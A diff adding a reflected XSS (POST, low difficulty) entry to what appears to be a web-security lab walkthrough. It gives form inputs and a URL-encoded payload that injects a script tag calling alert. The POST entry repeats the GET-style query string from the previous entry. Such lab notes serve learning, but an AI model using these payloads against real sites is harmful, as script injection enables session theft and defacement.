@@ -19,3 +19,13 @@ $
 // Payload:
 "?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit"
 ```
+
+### (3) Cross-Site Scripting - Reflected (POST) (low)
+```JS
+// Input 1:
+"Hacker"
+// Input 2:
+"<script>alert("XSS")</script>"
+// Payload:
+"?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit"
+```
